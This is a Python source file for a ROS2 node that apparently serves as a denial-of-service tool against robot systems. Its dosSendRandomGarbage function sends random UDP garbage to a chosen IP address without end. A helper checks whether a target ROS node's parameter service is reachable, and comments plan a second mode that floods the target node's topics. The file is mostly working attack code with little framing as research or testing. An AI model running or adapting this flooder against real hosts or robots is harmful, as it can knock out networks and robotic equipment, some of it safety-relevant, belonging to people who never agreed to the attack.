import rclpy, sys
from rclpy.node import Node
from rclpy import Parameter
from std_srvs.srv import Empty
from rcl_interfaces.srv import GetParameters
from ros2node.api import get_node_names
import random, socket

class dosnode(Node):
    def __init__(self):
        super().__init__("dosnode")
        self.declare_parameter('dos_ip_objective', "Unset")
        self.declare_parameter('dosobjective', "Unset")
        self.declare_parameter('dostype', 'Fill')

def printargs(node):
    """Prints every param present in the node and its values

       Parameters
       ----------
       node: Node
         The node 
    """
    
    for i in node.get_parameters_by_prefix(''):
        pamname=i
        pamvalue=node.get_parameter(i)._value
        #pamvalue=node.get_parameter_or(pamname).get_parameter_value()
        node.get_logger().info(f'Name of parameter:{pamname}   Value of the parameter: {pamvalue}')

def checkService(node):
    objectiveParam = node.get_parameter('dosobjective')._value
    client = node.create_client(GetParameters, f'/{objectiveParam}/get_parameters')
    if not client.wait_for_service(timeout_sec=5.0):
        node.get_logger().info(f'Not able to connect that node {objectiveParam}')
        sys.exit()

def dosSendRandomGarbage(ipdest,node):
    port = random.randint(0,65534)
    ip_addr = ipdest
    data = (str(random.getrandbits(4096))).encode()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    node.get_logger().info(f'Launching garbage into {ipdest} port {port}')
    while True:
        s.sendto(data, (ip_addr, port))

def main():
    rclpy.init()
    mydosnode = dosnode()
    printargs(mydosnode)


    ipobjectiveParam = mydosnode.get_parameter('dos_ip_objective')._value

    if ipobjectiveParam == 'Unset':
        checkService(mydosnode)
    else:
        print('Regular dos attack, we can choose between ping and random garbage')
        dosSendRandomGarbage(ipobjectiveParam,mydosnode)

    
    # In ROS2 there is no mode right now of getting the ip of the node which manages a node. so we are going to take a parameter, 
    # it will be the ip
    # TODO: Maybe I should try DDS with python to get it. 
    # We will have two DOS modes
    # 1.- We will dos the host by ip. network layer. We need to provide the ip or the host.
    # 2.- We will try to fill the ros node's topics to make it to fail. 


    rclpy.spin(mydosnode)

    rclpy.shutdown()


if __name__ == '__main__':
    main()
